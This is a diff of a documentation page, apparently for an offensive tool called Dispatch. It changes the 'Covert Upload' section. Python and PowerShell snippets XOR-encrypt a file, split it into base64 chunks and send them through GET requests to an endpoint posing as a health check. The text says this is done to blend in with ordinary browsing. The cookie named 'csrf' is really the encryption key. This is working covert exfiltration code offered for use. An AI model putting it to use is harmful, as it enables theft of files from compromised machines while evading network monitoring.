@@ -250,7 +250,11 @@ for ($i = 0; $i -lt $data.Length; $i++) {
 
         <h4 class="card-title section-block" id="covert-upload">Covert Upload</h4>
             <p>
-                Use the code below to perform file upload using Dispatch's covert API endpoint. This method breaks files into XOR encrypted chunks before upload via <code>HTTP [GET]</code> requests - blending in with standard browsing activity. Data is then tracked and reassembled server-side.
+                Upload through <code>/api/v1/health</code> with <code>GET</code> or <code>POST</code>.
+                Start with <code>init=1</code> and a filename. The server returns a <code>csrf</code> cookie that is the XOR key.
+                Send each chunk as base64 in <code>data</code>, and send the same key as the <code>key</code> parameter if the cookie is not kept.
+                Finish with a chunk that contains the marker <code>&lt;EOF&gt;</code>.
+                The caller needs an upload-capable user or <code>X-Dispatch-Auth</code> key. Chunk size is chosen by the client.
             </p>
 
             <h5 class="card-title">Python Covert Upload</h5>
@@ -298,12 +302,12 @@ def main():
                 break
             enc = xor_bytes(chunk, key_bytes)
             b64 = base64.b64encode(enc).decode("ascii")
-            rr = s.get(endpoint, params={"data": b64}, headers=headers, verify=False, timeout=30)
+            rr = s.get(endpoint, params={"key": key, "data": b64}, headers=headers, verify=False, timeout=30)
             rr.raise_for_status()
 
     eof_enc = xor_bytes(b"&lt;EOF&gt;", key_bytes)
     eof_b64 = base64.b64encode(eof_enc).decode("ascii")
-    rr = s.get(endpoint, params={"data": eof_b64}, headers=headers, verify=False, timeout=30)
+    rr = s.get(endpoint, params={"key": key, "data": eof_b64}, headers=headers, verify=False, timeout=30)
     rr.raise_for_status()
     print("Upload complete:", rr.text)
 
@@ -350,7 +354,7 @@ try {
         $chunk = if ($read -eq $buffer.Length) { $buffer } else { $buffer[0..($read-1)] }
         $enc = Xor-Bytes $chunk $keyBytes
         $b64 = [System.Convert]::ToBase64String($enc)
-        $null = $wc.DownloadString("$endpoint?data=$([uri]::EscapeDataString($b64))")
+        $null = $wc.DownloadString("$endpoint?key=$([uri]::EscapeDataString($key))&data=$([uri]::EscapeDataString($b64))")
     }
 }
 finally { $fs.Close() }
@@ -358,7 +362,7 @@ finally { $fs.Close() }
 $eof = [System.Text.Encoding]::ASCII.GetBytes("&lt;EOF&gt;")
 $eofEnc = Xor-Bytes $eof $keyBytes
 $eofB64 = [System.Convert]::ToBase64String($eofEnc)
-$result = $wc.DownloadString("$endpoint?data=$([uri]::EscapeDataString($eofB64))")
+$result = $wc.DownloadString("$endpoint?key=$([uri]::EscapeDataString($key))&data=$([uri]::EscapeDataString($eofB64))")
 Write-Output "Upload complete: $result"</code><span class="copy-btn" onclick="copyCode('upload_ps1')">
                 <i class="bi bi-clipboard"></i>
             </span></pre>
